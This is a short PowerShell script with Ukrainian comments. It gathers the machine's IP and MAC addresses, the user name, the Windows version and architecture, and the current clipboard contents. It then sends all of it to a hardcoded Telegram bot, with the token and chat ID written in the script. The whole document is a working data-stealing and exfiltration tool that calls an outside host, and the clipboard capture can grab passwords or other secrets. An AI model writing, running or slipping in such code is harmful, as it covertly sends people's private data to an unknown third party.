# Отримуємо інформацію про операційну систему
$os = Get-CimInstance -ClassName Win32_OperatingSystem

# Отримуємо IP-адресу, MAC-адресу та ім'я користувача
$ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.AddressState -eq 'Preferred'}).IPAddress
$macAddress = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).MacAddress
$userName = [System.Environment]::UserName
$clipboardContent = Get-Clipboard

# Формуємо текст повідомлення
$message = @"
IP адреса: $ipAddress
MAC адреса: $macAddress
Назва користувача: $userName
Версія Windows: $($os.Caption)
Архітектура ОС: $($os.OSArchitecture)
В буфері обміну: $clipboardContent
"@

# Відправляємо повідомлення через Telegram Bot API
Invoke-RestMethod -Uri "https://api.telegram.org/bot8082747013:AAGap4vyzOdAI7BIzsx16qhS5_n3kXXw_rA/sendMessage" `
                  -Method Post `
                  -ContentType "application/x-www-form-urlencoded" `
                  -Body @{chat_id="6039088675"; text=$message}

